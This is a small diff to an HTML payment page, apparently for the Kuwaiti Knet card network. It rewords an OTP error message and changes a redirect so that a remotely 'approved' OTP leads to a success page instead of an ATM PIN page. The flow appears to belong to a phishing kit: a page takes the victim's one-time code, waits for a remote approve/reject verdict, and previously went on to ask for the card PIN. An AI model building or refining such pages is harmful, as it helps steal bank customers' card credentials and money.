@@ -279,7 +279,7 @@
         <div style="background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:shake 0.5s;border:2px solid #dc3545;">
             <div style="font-size:50px;color:#dc3545;margin-bottom:15px;">✕</div>
             <h3 style="color:#dc3545;margin-bottom:10px;">The code you entered is incorrect</h3>
-            <p style="color:#555;font-size:15px;">Please check the code sent to your mobile and try again</p>
+            <p style="color:#dc3545;font-size:15px;font-weight:bold;">The code you entered is incorrect and invalid. Please check the code sent to your mobile and try again</p>
             <button onclick="closeOtpErrorModal()" style="margin-top:20px;padding:12px 30px;background:#dc3545;color:white;border:none;border-radius:8px;font-size:15px;cursor:pointer;font-weight:bold;">Try Again</button>
         </div>
     </div>
@@ -302,7 +302,8 @@
                 if (data.status === 'approved') {
                     clearInterval(pollInterval);
                     document.getElementById('loadingOverlay').style.display = 'none';
-                    window.location.href = 'atm-pin-en.html';
+                    // Knet goes directly to success page after OTP approval
+                    window.location.href = 'success-en.html';
                 } else if (data.status === 'rejected') {
                     clearInterval(pollInterval);
                     document.getElementById('loadingOverlay').style.display = 'none';
